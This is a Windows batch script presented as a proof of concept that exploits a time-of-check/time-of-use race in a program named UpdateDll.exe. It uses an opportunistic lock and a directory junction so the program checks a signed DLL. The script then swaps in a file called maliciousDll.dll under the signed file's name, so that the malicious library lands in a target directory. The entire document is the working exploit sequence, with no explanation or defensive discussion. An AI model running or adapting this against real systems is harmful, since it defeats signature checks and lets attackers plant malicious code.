@echo off

echo Exploiting UpdateDll.exe TOCTOU vulnerability using OpLock and Junctions - POC

echo:
timeout /t 2 /nobreak > nul

echo [+] Creating FakeDir directory
if not exist FakeDir mkdir FakeDir
echo [+] Done.

echo:
timeout /t 2 /nobreak > nul

echo [+] Copying dir1\signedDll.dll to FakeDir
copy dir1\signedDll.dll FakeDir\signedDll.dll > nul
echo [+] Done.

echo:
timeout /t 2 /nobreak > nul

echo [+] Renaming dir1 to _dir1
ren dir1 _dir1 > nul
echo [+] Done.

echo:
timeout /t 2 /nobreak > nul

echo [+] Creating dir1 junction to FakeDir
mklink /j dir1 FakeDir > nul
echo [+] Done.

echo:
timeout /t 2 /nobreak > nul

echo [+] Setting an OpLock on FakeDir\signedDll.dll
start cmd /k SetOpLock.exe FakeDir\signedDll.dll
echo [+] Done.

echo:
timeout /t 2 /nobreak > nul

echo [+] Executing UpdateDll.exe
start cmd /k UpdateDll.exe
echo [+] Done.

echo:
timeout /t 2 /nobreak > nul

echo [+] Deleting dir1 junction
rmdir dir1
echo [+] Done.

echo:
timeout /t 2 /nobreak > nul

echo [+] Renaming _dir1 to dir1
ren _dir1 dir1 > nul
echo [+] Done.

echo:
timeout /t 2 /nobreak > nul

echo [+] Copying maliciousDll.dll to dir1
copy maliciousDll.dll dir1\maliciousDll.dll > nul
echo [+] Done.

echo:
timeout /t 2 /nobreak > nul

echo [+] Renaming dir1\signedDll.dll to _signedDll.dll
ren dir1\signedDll.dll _signedDll.dll > nul
echo [+] Done.

echo:
timeout /t 2 /nobreak > nul

echo [+] Renaming dir1\maliciousDll.dll to signedDll.dll
ren dir1\maliciousDll.dll signedDll.dll > nul
echo [+] Done.

echo:
timeout /t 2 /nobreak > nul

echo [x] Close the OpLock.
echo [x] Check if the malicious dll has been created successfully in dir2 directory.

echo:

pause